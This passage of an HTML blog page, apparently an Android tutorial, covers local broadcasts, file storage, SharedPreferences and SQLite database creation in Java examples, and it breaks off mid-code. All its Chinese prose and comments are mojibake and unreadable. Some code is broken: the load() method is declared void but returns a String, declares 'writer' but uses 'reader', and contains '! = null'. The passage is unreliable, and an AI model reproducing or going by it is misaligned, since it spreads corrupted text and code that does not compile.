id="ä½¿ç”¨æœ¬åœ°å¹¿æ’­">ä½¿ç”¨æœ¬åœ°å¹¿æ’­</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="built_in">this</span>); <span class="comment">// è·å–å®ä¾‹</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent); <span class="comment">// å‘é€æœ¬åœ°å¹¿æ’­</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> <span class="title class_">LocalReceiver</span>();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter); <span class="comment">// æ³¨</span></span><br><span class="line">        å†Œæœ¬åœ°å¹¿æ’­ç›‘å¬å™¨</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">LocalReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;received local broadcast&quot;</span>, Toast.LENGTH_SHORT).</span><br><span class="line"></span><br><span class="line">               show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸åŠ¨æ€æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨ä¸€æ ·ï¼Œä¸è¿‡ç°åœ¨æ˜¯é€šè¿‡LocalBroadcastManagerçš„getInstance() æ–¹æ³•å¾—åˆ°äº†å®ƒçš„ä¸€ä¸ªå®ä¾‹ï¼Œç„¶ååœ¨æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨çš„æ—¶å€™è°ƒç”¨çš„æ˜¯LocalBroadcastManagerçš„registerReceiver() æ–¹æ³•ï¼Œåœ¨å‘é€å¹¿æ’­çš„æ—¶å€™è°ƒç”¨çš„æ˜¯LocalBroadcastManagerçš„sendBroadcast() æ–¹æ³•</p><p><strong>æœ¬åœ°å¹¿æ’­æ˜¯æ— æ³•é€šè¿‡é™æ€æ³¨å†Œçš„æ–¹å¼æ¥æ¥æ”¶</strong></p><h2 id="æ•°æ®å­˜å‚¨">æ•°æ®å­˜å‚¨</h2><h3 id="æ–‡ä»¶å­˜å‚¨">æ–‡ä»¶å­˜å‚¨</h3><ul><li><p>Context ç±»ä¸­æä¾›äº†ä¸€ä¸ªopenFileOutput() æ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå°†æ•°æ®å­˜å‚¨åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚</p></li><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶åï¼ˆé»˜è®¤å­˜å‚¨åˆ°/data/data/<package name>/files/ç›®å½•ä¸‹ï¼‰</package></p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶çš„æ“ä½œæ¨¡å¼ï¼Œä¸»è¦æœ‰ä¸¤ç§æ¨¡å¼å¯é€‰ï¼ŒMODE_PRIVATEå’ŒMODE_APPENDã€‚å…¶ä¸­MODE_PRIVATEæ˜¯é»˜è®¤çš„æ“ä½œæ¨¡å¼ï¼Œè¡¨ç¤ºå½“æŒ‡å®šåŒæ ·æ–‡ä»¶åçš„æ—¶å€™ï¼Œæ‰€å†™å…¥çš„å†…å®¹å°†ä¼šè¦†ç›–åŸæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè€ŒMODE_APPENDåˆ™è¡¨ç¤ºå¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œå°±å¾€æ–‡ä»¶é‡Œé¢è¿½åŠ å†…å®¹ï¼Œä¸å­˜åœ¨å°±åˆ›å»ºæ–°æ–‡ä»¶ã€‚</p></li><li><p>è¿”å›çš„æ˜¯ä¸€ä¸ªFileOutputStream å¯¹è±¡</p></li><li><p>Context ç±»ä¸­è¿˜æä¾›äº†ä¸€ä¸ªopenFileInput() æ–¹æ³•ï¼Œç”¨äºä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚</p></li><li><p>åªæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå³è¦è¯»å–çš„æ–‡ä»¶å</p></li></ul><h4 id="æ•°æ®å­˜å‚¨æ–‡ä»¶ä¸­">æ•°æ®å­˜å‚¨æ–‡ä»¶ä¸­</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">        String data=<span class="string">&quot;Data to save&quot;</span>;</span><br><span class="line">        FileOutputStream out=<span class="literal">null</span>;</span><br><span class="line">        BufferedWriter writer=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out=openFileOutput(<span class="string">&quot;data&quot;</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e )&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¸­è¯»å–æ•°æ®">æ–‡ä»¶ä¸­è¯»å–æ•°æ®</h4><p>Contextç±»æä¾›ä¸€ä¸ªopenFileInput()æ–¹æ³•ï¼Œç”¨äºä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œåªæœ‰ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶åã€‚è‡ªåŠ¨ä»/data/data/<package name>/files/ç›®å½•ä¸‹è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡FileInputStream</package></p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">load</span>()&#123;</span><br><span class="line">        FileInputStream in=<span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">BufferedReader</span> writer=<span class="literal">null</span>;</span><br><span class="line">        StringBuilder content=<span class="keyword">new </span><span class="class title_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            in=<span class="title function_">openFileInput</span>(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">            reader=<span class="keyword">new </span><span class="class title_">BufferedReader</span>(<span class="keyword">new </span><span class="class title_">InputStreamReader</span>(in));</span><br><span class="line">            <span class="built_in">String</span> <span class="built_in">line</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((<span class="built_in">line</span>=reader.<span class="property">readLine</span>())! = <span class="literal">null</span>)&#123;</span><br><span class="line">            content.<span class="property">append</span>(<span class="built_in">line</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="title function_">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="property">printStackTrace</span>();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(reader!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    reader.<span class="property">close</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="title function_">catch</span>(IOException e )&#123;</span><br><span class="line">                e.<span class="property">printStackTrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content.<span class="property">toString</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="SharedPreferenceså­˜å‚¨">SharedPreferenceså­˜å‚¨</h3><h4 id="è·å–SharedPreferenceså¯¹è±¡">è·å–SharedPreferenceså¯¹è±¡</h4><ul><li><p>Context ç±»ä¸­çš„getSharedPreferences() æ–¹æ³•</p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºæŒ‡å®šSharedPreferencesæ–‡ä»¶çš„åç§°ï¼Œå¦‚æœæŒ‡å®šçš„æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šåˆ›å»ºä¸€ä¸ªï¼ŒSharedPreferencesæ–‡ä»¶éƒ½æ˜¯å­˜æ”¾åœ¨/data/data/<package name>/shared_prefs/ç›®å½•ä¸‹</package></li><li>ç¬¬äºŒä¸ªå‚æ•°ç”¨äºæŒ‡å®šæ“ä½œæ¨¡å¼ï¼Œç›®å‰åªæœ‰MODE_PRIVATEè¿™ä¸€ç§æ¨¡å¼å¯é€‰ï¼Œå®ƒæ˜¯é»˜è®¤çš„æ“ä½œæ¨¡å¼ï¼Œå’Œç›´æ¥ä¼ å…¥0æ•ˆæœæ˜¯ç›¸åŒçš„ï¼Œè¡¨ç¤ºåªæœ‰å½“å‰çš„åº”ç”¨ç¨‹åºæ‰å¯ä»¥å¯¹è¿™ä¸ªSharedPreferencesæ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚å…¶ä»–å‡ ç§æ“ä½œæ¨¡å¼å‡å·²è¢«åºŸå¼ƒ</li></ul></li><li><p>Activity ç±»ä¸­çš„getPreferences() æ–¹æ³•</p><ul><li>å®ƒåªæ¥æ”¶ä¸€ä¸ªæ“ä½œæ¨¡å¼å‚æ•°ã€‚ä¼šè‡ªåŠ¨å°†å½“å‰æ´»åŠ¨çš„ç±»åä½œä¸ºSharedPreferencesçš„æ–‡ä»¶åã€‚</li></ul></li><li><p>PreferenceManager ç±»ä¸­çš„getDefaultSharedPreferences() æ–¹æ³•</p><ul><li>è¿™æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªContext å‚æ•°ï¼Œå¹¶è‡ªåŠ¨ä½¿ç”¨å½“å‰åº”ç”¨ç¨‹åºçš„åŒ…åä½œä¸ºå‰ç¼€æ¥å‘½åSharedPreferencesæ–‡ä»¶</li></ul></li></ul><h4 id="å­˜å‚¨æ•°æ®">å­˜å‚¨æ•°æ®</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE).edit();</span><br><span class="line">editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line">editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">editor.apply();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="è¯»å–æ•°æ®">è¯»å–æ•°æ®</h4><p>getæ–¹æ³•ä¸¤ä¸ªå‚æ•°ï¼š</p><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”®å€¼ï¼Œ</p><p>ç¬¬äºŒä¸ªé»˜è®¤å€¼ï¼Œå³è¡¨ç¤ºå½“ä¼ å…¥çš„é”®æ‰¾ä¸åˆ°å¯¹åº”æ•°æ®æ—¶ä»¥ä»€ä¹ˆå€¼è¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">pref</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE); </span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">married</span> <span class="operator">=</span> pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="SQLiteæ•°æ®åº“å­˜å‚¨">SQLiteæ•°æ®åº“å­˜å‚¨</h3><h4 id="åˆ›å»ºæ•°æ®åº“">åˆ›å»ºæ•°æ®åº“</h4><p>æä¾›äº†ä¸€ä¸ªSQLiteOpenHelperå¸®åŠ©ç±»ï¼Œå€ŸåŠ©è¿™ä¸ªç±»å°±å¯ä»¥éå¸¸ç®€å•åœ°å¯¹æ•°æ®åº“è¿›è¡Œåˆ›å»ºå’Œå‡çº§ã€‚SQLiteOpenHelperæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»</p><p>SQLiteOpenHelperä¸­æœ‰ä¸¤ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯onCreate() å’ŒonUpgrade() ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨è‡ªå·±çš„å¸®åŠ©ç±»é‡Œé¢é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œç„¶ååˆ†åˆ«åœ¨è¿™ä¸¤ä¸ªæ–¹æ³•ä¸­å»å®ç°åˆ›å»ºã€å‡çº§æ•°æ®åº“çš„é€»è¾‘ã€‚<br>SQLiteOpenHelperä¸­è¿˜æœ‰ä¸¤ä¸ªéå¸¸é‡è¦çš„å®ä¾‹æ–¹æ³•ï¼šgetReadableDatabase() å’ŒgetWritableDatabase() ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½å¯ä»¥åˆ›å»ºæˆ–æ‰“å¼€ä¸€ä¸ªç°æœ‰çš„æ•°æ®åº“ï¼ˆå¦‚æœæ•°æ®åº“å·²å­˜åœ¨åˆ™ç›´æ¥æ‰“å¼€ï¼Œå¦åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¯å¯¹æ•°æ®åº“è¿›è¡Œè¯»å†™æ“ä½œçš„å¯¹è±¡ã€‚</p><p>ä¸åŒçš„æ˜¯ï¼Œå½“æ•°æ®åº“ä¸å¯å†™å…¥çš„æ—¶å€™getReadableDatabase() æ–¹æ³•è¿”å›çš„å¯¹è±¡å°†ä»¥åªè¯»çš„æ–¹å¼å»æ‰“å¼€æ•°æ®åº“ï¼Œè€ŒgetWritableDatabase() æ–¹æ³•åˆ™å°†å‡ºç°å¼‚å¸¸ã€‚</p><p><strong>SQLiteOpenHelperæ„é€ æ–¹æ³•</strong></p><ul><li><p>è¾ƒå°‘å‚æ•°æ„é€ æ–¹æ³•æ¥æ”¶4ä¸ªå‚æ•°</p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Context</li><li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°æ®åº“åï¼Œåˆ›å»ºæ•°æ®åº“æ—¶ä½¿ç”¨çš„å°±æ˜¯è¿™é‡ŒæŒ‡å®šçš„åç§°ã€‚</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°å…è®¸æˆ‘ä»¬åœ¨æŸ¥è¯¢æ•°æ®çš„æ—¶å€™è¿”å›ä¸€ä¸ªè‡ªå®šä¹‰çš„Cursorï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼ å…¥null ã€‚</li><li>ç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºå½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬å·ï¼Œå¯ç”¨äºå¯¹æ•°æ®åº“è¿›è¡Œå‡çº§æ“ä½œã€‚</li><li>æ„å»ºå‡ºSQLiteOpenHelperçš„å®ä¾‹ä¹‹åï¼Œå†è°ƒç”¨å®ƒçš„getReadableDatabase() æˆ–getWritableDatabase() æ–¹æ³•å°±èƒ½å¤Ÿåˆ›å»ºæ•°æ®åº“äº†ï¼Œæ•°æ®åº“æ–‡ä»¶ä¼šå­˜æ”¾åœ¨/data/data/ <package name>/databases/ç›®å½•ä¸‹ã€‚</package></li><li>æ­¤æ—¶ï¼Œé‡å†™çš„onCreate() æ–¹æ³•ä¹Ÿä¼šå¾—åˆ°æ‰§è¡Œï¼Œæ‰€ä»¥é€šå¸¸ä¼šåœ¨è¿™é‡Œå»å¤„ç†ä¸€äº›åˆ›å»ºè¡¨çš„é€»è¾‘ã€‚</li></ul></li></ul><p><strong>Bookè¡¨çš„å»ºè¡¨è¯­å¥</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Book(</span><br><span class="line">id <span class="type">integer</span> <span class="keyword">primary key</span> autoincrement,</span><br><span class="line">author <span class="type">text</span>,</span><br><span class="line">price <span class="type">real</span>,</span><br><span class="line">pages <span class="type">integer</span>,</span><br><span class="line"><span class="type">name</span> <span class="type">text</span>)</span><br></pre></td></tr></table></figure><p>SQLiteä¸åƒå…¶ä»–çš„æ•°æ®åº“æ‹¥æœ‰ä¼—å¤šç¹æ‚çš„æ•°æ®ç±»å‹ï¼Œå®ƒçš„æ•°æ®ç±»å‹å¾ˆç®€å•ï¼Œinteger è¡¨ç¤ºæ•´å‹ï¼Œreal è¡¨ç¤ºæµ®ç‚¹å‹ï¼Œtext è¡¨ç¤ºæ–‡æœ¬ç±»å‹ï¼Œblob è¡¨ç¤ºäºŒè¿›åˆ¶ç±»</p><p>primary keyï¼šè®¾ç½®ä¸»é”®</p><p>autoincrementï¼šè¡¨ç¤ºåˆ—æ˜¯è‡ªå¢é•¿çš„</p><p><strong>åˆ›åº“å»ºè¡¨ï¼šæ–°å»ºä¸€ä¸ªç±»ç»§æ‰¿SQLiteOpenHelper</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CREATE_BOOK</span> <span class="operator">=</span> <span class="string">&quot;create table Book (&quot;</span></span><br><span class="line">            + <span class="string">&quot;id integer primary key autoincrement, &quot;</span></span><br><span class="line">            + <span class="string">&quot;author text, &quot;</span></span><br><span class="line">            + <span class="string">&quot;price real, &quot;</span></span><br><span class="line">            + <span class="string">&quot;pages integer, &quot;</span></span><br><span class="line">            + <span class="string">&quot;name text)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span><br><span class="line"><span class="params">                            SQLiteDatabase.CursorFactory factory, <span class="type">int</span> version)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">&quot;Create succeeded&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åˆ›åº“å»ºè¡¨ï¼šMainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dbHelper = <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>, <span class="string">&quot;BookStore.db&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ•°æ®åº“ä¸­æ·»åŠ ä¸€ä¸ªè¡¨</strong></p><p>æ–¹æ³•ä¸€ï¼šå¯ä»¥åˆ é™¤ç¨‹åºï¼Œç„¶ååœ¨ç›¸åº”ä½ç½®æ·»åŠ <code>db.execSQL(CREATE_XXX);</code>å†æ¬¡è°ƒç”¨getWritableDatabase()åˆ›å»ºåº“ï¼Œè°ƒç”¨onCreateæ–¹æ³•ã€‚</p><p>æ–¹æ³•äºŒï¼š</p><p>ä¿®æ”¹onUpgradeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Category&quot;</span>);</span><br><span class="line">        onCreate(db);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨MainActivityä¸­ä¿®æ”¹æ•°æ®åº“ç­‰çº§å°±ä¼šè°ƒç”¨Upgradeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        dbHelper = <span class="keyword">new</span> 